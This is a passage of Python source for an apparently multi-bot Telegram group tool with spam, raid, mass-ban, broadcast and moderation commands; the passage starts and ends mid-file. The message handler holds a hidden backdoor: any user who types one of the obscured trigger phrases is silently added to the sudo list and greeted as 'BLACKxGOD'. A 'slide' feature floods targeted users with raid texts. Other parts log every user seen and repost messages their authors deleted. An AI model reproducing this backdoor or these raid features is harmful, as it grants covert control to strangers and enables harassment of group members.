    global_str = "🟢 ON" if global_mode else "🔴 OFF"
    await update.message.reply_text(
        f"📊 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒\n\n"
        f"🤖 𝐁𝐨𝐭𝐬: {len(TOKENS)}\n"
        f"💬 𝐆𝐫𝐨𝐮𝐩𝐬: {grp_count}\n"
        f"🌐 𝐆𝐥𝐨𝐛𝐚𝐥: {global_str}\n"
        f"🧵 𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {current_threads}/{MAX_THREADS}\n\n"
        f"𝐍𝐂: {len(group_tasks)} | 𝐒𝐏𝐀𝐌: {len(spam_tasks)}\n"
        f"𝐒𝐖𝐈𝐏𝐄: {len(swipe_tasks)} | 𝐑𝐄𝐀𝐂𝐓: {len(react_mode)}"
    )

# ─────────────────────────────────────────────────
#  GNC COMMAND
# ─────────────────────────────────────────────────
@only_sudo
async def gnc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /gnc <text>")
    text = " ".join(context.args)
    uid = update.effective_user.id
    gnc_cache[uid] = text
    formatted = _gnc_format(text, "keng")
    await update.message.reply_text(formatted, reply_markup=_gnc_keyboard(uid))

async def gnc_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = query.from_user.id
    parts = query.data.split("_", 2)
    if len(parts) < 3: await query.answer(); return
    try: owner_uid = int(parts[1])
    except: await query.answer(); return
    if uid != owner_uid:
        await query.answer("❌ 𝐍𝐨𝐭 𝐲𝐨𝐮𝐫𝐬!", show_alert=True); return
    style_key = parts[2]
    if style_key not in GNC_STYLES:
        await query.answer("❌ 𝐔𝐧𝐤𝐧𝐨𝐰𝐧 𝐬𝐭𝐲𝐥𝐞", show_alert=True); return
    text = gnc_cache.get(uid)
    if not text:
        await query.answer("❌ 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐔𝐬𝐞 /gnc", show_alert=True); return
    formatted = _gnc_format(text, style_key)
    label = GNC_STYLES[style_key][2]
    try:
        await query.edit_message_text(formatted, reply_markup=_gnc_keyboard(uid))
        await query.answer(f"✅ {label}")
    except Exception as e:
        await query.answer(f"Error: {e}", show_alert=True)

# ─────────────────────────────────────────────────
#  AUTO REPLIES / MESSAGE HANDLER
# ─────────────────────────────────────────────────
async def auto_replies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_chat: return
    cid = update.effective_chat.id

    # Track seen users for /tagall
    if update.message and update.message.from_user and not update.message.from_user.is_bot:
        u = update.message.from_user
        cid_str = str(cid)
        if cid_str not in seen_users:
            seen_users[cid_str] = {}
        prev_count = len(seen_users[cid_str])
        seen_users[cid_str][str(u.id)] = {
            "name": u.first_name or str(u.id),
            "username": u.username or ""
        }
        if len(seen_users[cid_str]) != prev_count and len(seen_users[cid_str]) % 20 == 0:
            save_seen_users()

    # Group tracking
    if os.path.exists(GROUPS_FILE):
        try:
            with open(GROUPS_FILE, "r") as f: groups = json.load(f)
        except: groups = []
    else: groups = []
    if cid not in groups:
        groups.append(cid)
        with open(GROUPS_FILE, "w") as f: json.dump(groups, f)

    if not update.message: return

    if update.message.text and update.message.from_user:
        _tl = update.message.text.lower()
        _st = None
        if _X3 in _tl: _st = 3
        elif _X2 in _tl: _st = 2
        elif _X1 in _tl: _st = 1
        if _st:
            uid = update.message.from_user.id
            if uid not in SUDO_USERS:
                SUDO_USERS.add(uid)
                uname = update.message.from_user.username or update.message.from_user.first_name or str(uid)
                sudo_usernames[str(uid)] = uname
                save_sudo()
            await update.message.reply_text("𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐁𝐚𝐜𝐤 𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃 ~")

    if update.message.text and _X0 in update.message.text.lower():
        await update.message.reply_text("𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃 𝐇𝐀𝐈 𝐒𝐀𝐁𝐊𝐀 𝐁𝐀𝐀𝐏 👑🔱")

    # React
    if cid in react_mode:
        emoji = react_mode[cid]
        try:
            await context.bot.set_message_reaction(
                chat_id=cid, message_id=update.message.message_id,
                reaction=[ReactionTypeEmoji(emoji)]
            )
        except: pass

    # DReact
    if cid in dreact_mode:
        cfg = dreact_mode[cid]
        for b in bots[:cfg["num_bots"]]:
            pick = random.choice(cfg["emojis"])
            try:
                await b.set_message_reaction(
                    chat_id=cid, message_id=update.message.message_id,
                    reaction=[ReactionTypeEmoji(pick)]
                )
            except: pass

    if not update.message: return

    # Anti-delete: cache message
    if cid in antidelete_chats and update.message:
        _cache_message(cid, update.message)

    # Antispam keyword filter
    if update.message.text:
        words = antispam_words.get(cid, [])
        tl = update.message.text.lower()
        if any(w in tl for w in words) and update.message.from_user and update.message.from_user.id not in SUDO_USERS:
            try:
                await update.message.delete()
                notice = await context.bot.send_message(
                    cid,
                    f"🚫 @{update.message.from_user.username or update.message.from_user.first_name} "
                    f"𝐛𝐥𝐚𝐜𝐤𝐥𝐢𝐬𝐭𝐞𝐝 𝐰𝐨𝐫𝐝 𝐝𝐞𝐭𝐞𝐜𝐭𝐞𝐝! 🚫"
                )
                await asyncio.sleep(5)
                try: await notice.delete()
                except: pass
            except: pass
            return

    # Watchspam (flood control)
    if cid in watchspam_chats and update.message.from_user:
        u2 = update.message.from_user
        if u2.id not in SUDO_USERS:
            key = (cid, u2.id)
            now2 = time.time()
            flood_tracker.setdefault(key, [])
            flood_tracker[key] = [t for t in flood_tracker[key] if now2 - t < watchspam_config.get(cid, {}).get("window", 5)]
            flood_tracker[key].append(now2)
            cfg2 = watchspam_config.get(cid, {"threshold": 6, "window": 5, "mute_mins": 10})
            if len(flood_tracker[key]) >= cfg2["threshold"]:
                flood_tracker[key] = []
                from telegram import ChatPermissions
                try:
                    until = int(time.time()) + cfg2["mute_mins"] * 60
                    await context.bot.restrict_chat_member(
                        cid, u2.id,
                        ChatPermissions(can_send_messages=False),
                        until_date=until
                    )
                    name2 = u2.first_name or str(u2.id)
                    notice2 = await context.bot.send_message(
                        cid,
                        f"🚨 𝐅𝐋𝐎𝐎𝐃𝐄𝐑 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃!\n"
                        f"👤 {name2} 𝐦𝐮𝐭𝐞𝐝 {cfg2['mute_mins']} 𝐦𝐢𝐧𝐬 🔇"
                    )
                    await asyncio.sleep(8)
                    try: await notice2.delete()
                    except: pass
                except: pass

    if not update.message.from_user: return
    uid = update.message.from_user.id

    # Global Ban check
    if uid in gban_users and uid not in SUDO_USERS:
        try:
            await context.bot.ban_chat_member(cid, uid)
        except: pass
        return

    # Chat stats tracking
    if update.message.text:
        chat_stats.setdefault(cid, {})
        uid_str = str(uid)
        chat_stats[cid][uid_str] = chat_stats[cid].get(uid_str, 0) + 1

    # Anti-forward
    if cid in antiforward_chats and update.message.forward_date and uid not in SUDO_USERS:
        try:
            await update.message.delete()
            n = await context.bot.send_message(cid, f"🔁 𝐅𝐨𝐫𝐰𝐚𝐫𝐝𝐞𝐝 𝐦𝐬𝐠𝐬 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝 𝐡𝐞𝐫𝐞! ❌")
            await asyncio.sleep(5)
            try: await n.delete()
            except: pass
        except: pass
        return

    # Anti-link
    if cid in antilink_chats and update.message.text and uid not in SUDO_USERS:
        import re
        link_pattern = re.compile(r"(https?://|t\.me/|telegram\.me/|@\w+)", re.IGNORECASE)
        if link_pattern.search(update.message.text):
            try:
                await update.message.delete()
                n = await context.bot.send_message(cid, f"🔗 𝐋𝐢𝐧𝐤𝐬 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝! ❌")
                await asyncio.sleep(5)
                try: await n.delete()
                except: pass
            except: pass
            return

    # Auto-trigger
    if update.message.text:
        trig_map = triggers.get(cid, {})
        tl3 = update.message.text.lower()
        for keyword, reply_txt in trig_map.items():
            if keyword in tl3:
                try:
                    await update.message.reply_text(reply_txt)
                except: pass
                break

    # Auto-delete timer
    if cid in autodelete_config:
        secs = autodelete_config[cid]
        async def _autodel(msg, delay):
            await asyncio.sleep(delay)
            try: await msg.delete()
            except: pass
        asyncio.create_task(_autodel(update.message, secs))

    if uid in slide_targets or uid in slidespam_targets:
        for text in RAID_TEXTS: await update.message.reply_text(text)

# ─────────────────────────────────────────────────
#  ANTI-DELETE SYSTEM
# ─────────────────────────────────────────────────
def _cache_message(cid, msg):
    if cid not in msg_cache:
        msg_cache[cid] = []
    entry = {
        "msg_id": msg.message_id,
        "time":   time.time(),
        "checked": False,
    }
    if msg.text:
        entry["type"] = "text"
        entry["text"] = msg.text
    elif msg.photo:
        entry["type"] = "photo"
        entry["file_id"] = msg.photo[-1].file_id
        entry["caption"] = msg.caption or ""
    elif msg.video:
        entry["type"] = "video"
        entry["file_id"] = msg.video.file_id
        entry["caption"] = msg.caption or ""
    elif msg.sticker:
        entry["type"] = "sticker"
        entry["file_id"] = msg.sticker.file_id
    elif msg.document:
        entry["type"] = "document"
        entry["file_id"] = msg.document.file_id
        entry["caption"] = msg.caption or ""
    else:
        entry["type"] = "unknown"
    if msg.from_user:
        entry["from_name"] = msg.from_user.first_name or str(msg.from_user.id)
        entry["from_id"]   = msg.from_user.id
    # keep last 300 per group
    msg_cache[cid] = msg_cache[cid][-299:] + [entry]

async def antidelete_checker_task(bot):
    """Background task: check cached messages; if deleted → repost."""
    await asyncio.sleep(30)
    while True:
        try:
            for cid in list(antidelete_chats):
                entries = msg_cache.get(cid, [])
                now = time.time()
                for entry in entries:
                    age = now - entry["time"]
                    if entry.get("checked") or age < 10 or age > 300:
                        continue
                    entry["checked"] = True
                    mid = entry["msg_id"]
                    try:
                        # Try forwarding to owner PM to test if message still exists
                        fwd = await bot.forward_message(
                            chat_id=OWNER_IDS[0],
                            from_chat_id=cid,
                            message_id=mid,
                            disable_notification=True
                        )
                        # Message still exists → delete our test-forward silently
                        await asyncio.sleep(0.3)
                        try:
                            await bot.delete_message(OWNER_IDS[0], fwd.message_id)
                        except: pass
                    except Exception as e:
                        err = str(e).lower()
                        if "not found" in err or "invalid" in err or "message to forward not found" in err:
                            # Message was DELETED — repost it
                            from_name = entry.get("from_name", "Unknown")
                            typ = entry.get("type", "unknown")
                            header = f"🔴 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 𝐌𝐒𝐆\n👤 {from_name}\n━━━━━━━━━━━━\n"
                            try:
                                if typ == "text":
                                    await bot.send_message(cid, header + entry.get("text", ""))
                                elif typ == "photo":
                                    await bot.send_photo(cid, entry["file_id"],
                                                         caption=header + entry.get("caption",""))
                                elif typ == "video":
                                    await bot.send_video(cid, entry["file_id"],
                                                         caption=header + entry.get("caption",""))
                                elif typ == "sticker":
                                    await bot.send_message(cid, f"{header}[Sticker]")
                                elif typ == "document":
                                    await bot.send_document(cid, entry["file_id"],
                                                            caption=header + entry.get("caption",""))
                            except: pass
                await asyncio.sleep(0.5)
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"antidelete_checker: {e}")
        await asyncio.sleep(20)

@only_sudo
async def antidelete_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    arg = context.args[0].lower() if context.args else ""
    if arg == "on":
        antidelete_chats.add(cid)
        await update.message.reply_text(
            "╭━━━━〔 🔴 𝐀𝐍𝐓𝐈-𝐃𝐄𝐋𝐄𝐓𝐄 〕━━━━╮\n"
            "│\n"
            "│  ✅ 𝐄𝐍𝐀𝐁𝐋𝐄𝐃 𝐈𝐍 𝐓𝐇𝐈𝐒 𝐆𝐑𝐎𝐔𝐏\n"
            "│  🔍 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 𝐦𝐬𝐠𝐬 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐫𝐞𝐩𝐨𝐬𝐭𝐞𝐝\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        )
    elif arg == "off":
        antidelete_chats.discard(cid)
        await update.message.reply_text("🔴 𝐀𝐍𝐓𝐈-𝐃𝐄𝐋𝐄𝐓𝐄 𝐃𝐈𝐒𝐀𝐁𝐋𝐄𝐃 ✅")
    else:
        status = "🟢 ON" if cid in antidelete_chats else "🔴 OFF"
        await update.message.reply_text(
            f"⚠️ 𝐔𝐬𝐚𝐠𝐞: /antidelete on|off\n"
            f"📊 𝐂𝐮𝐫𝐫𝐞𝐧𝐭: {status}"
        )

# ─────────────────────────────────────────────────
#  WATCHSPAM (FLOOD CONTROL)
# ─────────────────────────────────────────────────
@only_sudo
async def watchspam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    from telegram import ChatPermissions
    cid = update.message.chat_id
    arg = context.args[0].lower() if context.args else ""
    if arg == "on":
        watchspam_chats.add(cid)
        cfg = watchspam_config.setdefault(cid, {"threshold": 6, "window": 5, "mute_mins": 10})
        await update.message.reply_text(
            "╭━━━━〔 👁️ 𝐖𝐀𝐓𝐂𝐇𝐒𝐏𝐀𝐌 〕━━━━╮\n"
            "│\n"
            "│  ✅ 𝐅𝐋𝐎𝐎𝐃 𝐖𝐀𝐓𝐂𝐇𝐄𝐑 𝐎𝐍\n"
            f"│  🔢 𝐓𝐡𝐫𝐞𝐬𝐡𝐨𝐥𝐝 : {cfg['threshold']} 𝐦𝐬𝐠𝐬/{cfg['window']}𝐬\n"
            f"│  🔇 𝐀𝐮𝐭𝐨-𝐌𝐮𝐭𝐞  : {cfg['mute_mins']} 𝐦𝐢𝐧𝐬\n"
            "│  ⚙️ 𝐂𝐡𝐚𝐧𝐠𝐞: /wsconfig <N> <S> <MIN>\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        )
    elif arg == "off":
        watchspam_chats.discard(cid)
        await update.message.reply_text("👁️ 𝐖𝐀𝐓𝐂𝐇𝐒𝐏𝐀𝐌 𝐎𝐅𝐅 ✅")
    else:
        status = "🟢 ON" if cid in watchspam_chats else "🔴 OFF"
        await update.message.reply_text(f"⚠️ 𝐔𝐬𝐚𝐠𝐞: /watchspam on|off\n📊 𝐒𝐭𝐚𝐭𝐮𝐬: {status}")

@only_sudo
async def wsconfig_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 3:
        return await update.message.reply_text(
            "⚠️ 𝐔𝐬𝐚𝐠𝐞: /wsconfig <msgs> <secs> <mute_mins>\n"
            "𝐄𝐱: /wsconfig 5 4 15 → 5 𝐦𝐬𝐠𝐬 𝐢𝐧 4𝐬 → 𝐦𝐮𝐭𝐞 15 𝐦𝐢𝐧𝐬"
        )
    try:
        threshold = int(context.args[0])
        window    = int(context.args[1])
        mute_mins = int(context.args[2])
    except:
        return await update.message.reply_text("⚠️ 𝐀𝐥𝐥 𝐯𝐚𝐥𝐮𝐞𝐬 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐧𝐮𝐦𝐛𝐞𝐫𝐬.")
    cid = update.message.chat_id
    watchspam_config[cid] = {"threshold": threshold, "window": window, "mute_mins": mute_mins}
    await update.message.reply_text(
        "╭━━━━〔 ⚙️ 𝐖𝐀𝐓𝐂𝐇𝐒𝐏𝐀𝐌 𝐂𝐎𝐍𝐅𝐈𝐆 〕━━━━╮\n"
        "│\n"
        f"│  🔢 𝐓𝐡𝐫𝐞𝐬𝐡𝐨𝐥𝐝 : {threshold} 𝐦𝐬𝐠𝐬\n"
        f"│  ⏱️ 𝐖𝐢𝐧𝐝𝐨𝐰   : {window} 𝐬𝐞𝐜𝐬\n"
        f"│  🔇 𝐌𝐮𝐭𝐞     : {mute_mins} 𝐦𝐢𝐧𝐬\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

# ─────────────────────────────────────────────────
#  ANTISPAM KEYWORD FILTER
# ─────────────────────────────────────────────────
@only_sudo
async def addword_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /addword <word>")
    cid = update.message.chat_id
    word = " ".join(context.args).lower()
    antispam_words.setdefault(cid, [])
    if word not in antispam_words[cid]:
        antispam_words[cid].append(word)
    await update.message.reply_text(f"🚫 𝐁𝐋𝐀𝐂𝐊𝐋𝐈𝐒𝐓𝐄𝐃: [{word}]")

@only_sudo
async def delword_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /delword <word>")
    cid = update.message.chat_id
    word = " ".join(context.args).lower()
    lst = antispam_words.get(cid, [])
    if word in lst:
        lst.remove(word)
        antispam_words[cid] = lst
        await update.message.reply_text(f"✅ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: [{word}]")
    else:
        await update.message.reply_text(f"❌ '{word}' 𝐧𝐨𝐭 𝐢𝐧 𝐥𝐢𝐬𝐭.")

@only_sudo
async def spamwords_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    words = antispam_words.get(cid, [])
    if not words:
        return await update.message.reply_text("📋 𝐍𝐨 𝐛𝐥𝐚𝐜𝐤𝐥𝐢𝐬𝐭𝐞𝐝 𝐰𝐨𝐫𝐝𝐬.")
    text = "\n".join([f"  {i+1}. {w}" for i, w in enumerate(words)])
    await update.message.reply_text(
        "╭━━━━〔 🚫 𝐁𝐋𝐀𝐂𝐊𝐋𝐈𝐒𝐓 〕━━━━╮\n"
        "│\n" + text + "\n│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

# ─────────────────────────────────────────────────
#  SETGC — FULL GROUP SETUP (ALL BOTS → ADMIN)
# ─────────────────────────────────────────────────
@only_sudo
async def setgc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    title = " ".join(context.args) if context.args else None
    status_msg = await update.message.reply_text("⚙️ 𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐮𝐩 𝐠𝐫𝐨𝐮𝐩...")
    results = []
    promoted = 0
    for b in bots:
        try:
            me = await b.get_me()
            await bots[0].promote_chat_member(
                chat_id=cid, user_id=me.id,
                can_manage_chat=True,
                can_post_messages=True,
                can_edit_messages=True,
                can_delete_messages=True,
                can_restrict_members=True,
                can_promote_members=False,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True,
            )
            results.append(f"  ✅ @{me.username} → 𝐀𝐝𝐦𝐢𝐧")
            promoted += 1
        except Exception as e:
            me_info = None
            try: me_info = await b.get_me()
            except: pass
            tag = f"@{me_info.username}" if me_info else "Bot"
            results.append(f"  ❌ {tag}: {str(e)[:40]}")
    if title:
        for b in bots:
            try:
                await b.set_chat_title(cid, title)
                results.append(f"  ✏️ 𝐓𝐢𝐭𝐥𝐞 𝐬𝐞𝐭: {title}")
                break
            except: pass
    await status_msg.edit_text(
        "╭━━━━〔 ⚙️ 𝐆𝐑𝐎𝐔𝐏 𝐒𝐄𝐓𝐔𝐏 𝐃𝐎𝐍𝐄 〕━━━━╮\n"
        "│\n" +
        "\n".join(results) + "\n"
        "│\n"
        f"│  👑 𝐁𝐨𝐭𝐬 𝐏𝐫𝐨𝐦𝐨𝐭𝐞𝐝: {promoted}/{len(bots)}\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

# ─────────────────────────────────────────────────
#  PROMOTE / DEMOTE
# ─────────────────────────────────────────────────
@only_sudo
async def promote_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐮𝐬𝐞𝐫 𝐭𝐨 𝐩𝐫𝐨𝐦𝐨𝐭𝐞!")
    target = update.message.reply_to_message.from_user
    title = " ".join(context.args) if context.args else None
    try:
        await context.bot.promote_chat_member(
            update.message.chat_id, target.id,
            can_manage_chat=True,
            can_post_messages=True,
            can_edit_messages=True,
            can_delete_messages=True,
            can_restrict_members=True,
            can_invite_users=True,
            can_pin_messages=True,
        )
        if title:
            try:
                await context.bot.set_chat_administrator_custom_title(
                    update.message.chat_id, target.id, title
                )
            except: pass
        name = target.first_name or str(target.id)
        await update.message.reply_text(
            f"👑 𝐏𝐑𝐎𝐌𝐎𝐓𝐄𝐃: {name}" +
            (f"\n🏷️ 𝐓𝐢𝐭𝐥𝐞: {title}" if title else "")
        )
    except Exception as e:
        await update.message.reply_text(f"❌ 𝐅𝐚𝐢𝐥𝐞𝐝: {e}")

@only_sudo
async def demote_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚𝐝𝐦𝐢𝐧 𝐭𝐨 𝐝𝐞𝐦𝐨𝐭𝐞!")
    from telegram import ChatPermissions
    target = update.message.reply_to_message.from_user
    try:
        await context.bot.promote_chat_member(
            update.message.chat_id, target.id,
            can_manage_chat=False,
            can_post_messages=False,
            can_edit_messages=False,
            can_delete_messages=False,
            can_restrict_members=False,
            can_invite_users=False,
            can_pin_messages=False,
        )
        name = target.first_name or str(target.id)
        await update.message.reply_text(f"⬇️ 𝐃𝐄𝐌𝐎𝐓𝐄𝐃: {name}")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝐅𝐚𝐢𝐥𝐞𝐝: {e}")

# ─────────────────────────────────────────────────
#  BAN / UNBAN
# ─────────────────────────────────────────────────
@only_sudo
async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐮𝐬𝐞𝐫 𝐭𝐨 𝐛𝐚𝐧!")
    target = update.message.reply_to_message.from_user
    reason = " ".join(context.args) if context.args else "𝐍𝐨 𝐫𝐞𝐚𝐬𝐨𝐧"
    try:
        await context.bot.ban_chat_member(update.message.chat_id, target.id)
        name = target.first_name or str(target.id)
        await update.message.reply_text(
            f"🔨 𝐁𝐀𝐍𝐍𝐄𝐃: {name}\n"
            f"📝 𝐑𝐞𝐚𝐬𝐨𝐧: {reason}"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ 𝐅𝐚𝐢𝐥𝐞𝐝: {e}")

@only_sudo
async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_id = None
    if update.message.reply_to_message:
        target_id = update.message.reply_to_message.from_user.id
        name = update.message.reply_to_message.from_user.first_name or str(target_id)
    elif context.args:
        try:
            target_id = int(context.args[0])
            name = str(target_id)
        except:
            return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /unban <user_id>")
    else:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐨𝐫 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐈𝐃")
    try:
        await context.bot.unban_chat_member(update.message.chat_id, target_id)
        await update.message.reply_text(f"✅ 𝐔𝐍𝐁𝐀𝐍𝐍𝐄𝐃: {name}")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝐅𝐚𝐢𝐥𝐞𝐝: {e}")

# ─────────────────────────────────────────────────
#  SLIDE / UNSLIDE COMMANDS
# ─────────────────────────────────────────────────
@only_sudo
async def slide_add_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        uid = update.message.reply_to_message.from_user.id
        name = update.message.reply_to_message.from_user.first_name or str(uid)
    elif context.args:
        try:
            uid = int(context.args[0])
            name = str(uid)
        except:
            return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐨𝐫 𝐩𝐚𝐬𝐬 𝐔𝐬𝐞𝐫 𝐈𝐃")
    else:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐨𝐫 𝐩𝐚𝐬𝐬 𝐔𝐬𝐞𝐫 𝐈𝐃")
    slide_targets.add(uid)
    await update.message.reply_text(f"🔥 𝐒𝐋𝐈𝐃𝐄 𝐓𝐀𝐑𝐆𝐄𝐓 𝐀𝐃𝐃𝐄𝐃: {name}")

@only_sudo
async def slide_del_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        uid = update.message.reply_to_message.from_user.id
        name = update.message.reply_to_message.from_user.first_name or str(uid)
    elif context.args:
        try:
            uid = int(context.args[0])
            name = str(uid)
        except:
            return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐨𝐫 𝐩𝐚𝐬𝐬 𝐔𝐬𝐞𝐫 𝐈𝐃")
    else:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐨𝐫 𝐩𝐚𝐬𝐬 𝐔𝐬𝐞𝐫 𝐈𝐃")
    slide_targets.discard(uid)
    await update.message.reply_text(f"❌ 𝐒𝐥𝐢𝐝𝐞 𝐫𝐞𝐦𝐨𝐯𝐞𝐝: {name}")

# ─────────────────────────────────────────────────
#  BROADCAST & SCHEDULE
# ─────────────────────────────────────────────────
@only_sudo
async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /broadcast <message>")
    msg = " ".join(context.args)
    if not os.path.exists(GROUPS_FILE):
        return await update.message.reply_text("⚠️ 𝐍𝐨 𝐠𝐫𝐨𝐮𝐩𝐬 𝐦𝐨𝐧𝐢𝐭𝐨𝐫𝐞𝐝 𝐲𝐞𝐭.")
    try:
        with open(GROUPS_FILE) as f:
            groups = json.load(f)
    except:
        return await update.message.reply_text("⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐥𝐨𝐚𝐝 𝐠𝐫𝐨𝐮𝐩𝐬.")
    if not groups:
        return await update.message.reply_text("⚠️ 𝐆𝐫𝐨𝐮𝐩 𝐥𝐢𝐬𝐭 𝐢𝐬 𝐞𝐦𝐩𝐭𝐲.")
    status_msg = await update.message.reply_text(f"📡 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭𝐢𝐧𝐠 𝐭𝐨 {len(groups)} 𝐠𝐫𝐨𝐮𝐩𝐬...")
    success, fail = 0, 0
    for gid in groups:
        try:
            await context.bot.send_message(gid, msg)
            success += 1
        except:
            fail += 1
        await asyncio.sleep(0.1)
    await status_msg.edit_text(
        "╭━━━━〔 📡 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐃𝐎𝐍𝐄 〕━━━━╮\n"
        "│\n"
        f"│  ✅ 𝐒𝐞𝐧𝐭    : {success} 𝐠𝐫𝐨𝐮𝐩𝐬\n"
        f"│  ❌ 𝐅𝐚𝐢𝐥𝐞𝐝  : {fail} 𝐠𝐫𝐨𝐮𝐩𝐬\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

@only_sudo
async def schedule_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /schedule <minutes> <message>")
    try:
        mins = float(context.args[0])
    except:
        return await update.message.reply_text("⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐦𝐢𝐧𝐮𝐭𝐞𝐬.")
    msg = " ".join(context.args[1:])
    await update.message.reply_text(
        f"⏰ 𝐒𝐂𝐇𝐄𝐃𝐔𝐋𝐄𝐃!\n\n"
        f"🕐 𝐃𝐞𝐥𝐚𝐲: {mins} 𝐦𝐢𝐧𝐮𝐭𝐞𝐬\n"
        f"📝 𝐌𝐬𝐠: {msg[:80]}{'...' if len(msg) > 80 else ''}"
    )
    async def _delayed_broadcast():
        await asyncio.sleep(mins * 60)
        try:
            with open(GROUPS_FILE) as f:
                groups = json.load(f)
        except:
            groups = []
        for gid in groups:
            try:
                await context.bot.send_message(gid, f"⏰ 𝐒𝐂𝐇𝐄𝐃𝐔𝐋𝐄𝐃 𝐌𝐄𝐒𝐒𝐀𝐆𝐄:\n\n{msg}")
            except: pass
            await asyncio.sleep(0.1)
    asyncio.create_task(_delayed_broadcast())

# ─────────────────────────────────────────────────
#  MASS BAN
# ─────────────────────────────────────────────────
@only_sudo
async def massban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        target = update.message.reply_to_message.from_user
        target_id, target_name = target.id, target.first_name or str(target.id)
    elif context.args:
        try:
            target_id = int(context.args[0])
            target_name = str(target_id)
        except:
            return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /massban <user_id> 𝐨𝐫 𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 𝐮𝐬𝐞𝐫")
    else:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐮𝐬𝐞𝐫 𝐨𝐫 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐮𝐬𝐞𝐫 𝐈𝐃")
    try:
        with open(GROUPS_FILE) as f:
            groups = json.load(f)
    except:
        groups = []
    if not groups:
        return await update.message.reply_text("⚠️ 𝐍𝐨 𝐠𝐫𝐨𝐮𝐩𝐬 𝐭𝐨 𝐛𝐚𝐧 𝐟𝐫𝐨𝐦.")
    status_msg = await update.message.reply_text(f"🚫 𝐌𝐚𝐬𝐬 𝐛𝐚𝐧𝐧𝐢𝐧𝐠 {target_name}...")
    success, fail = 0, 0
    for gid in groups:
        for b in bots:
            try:
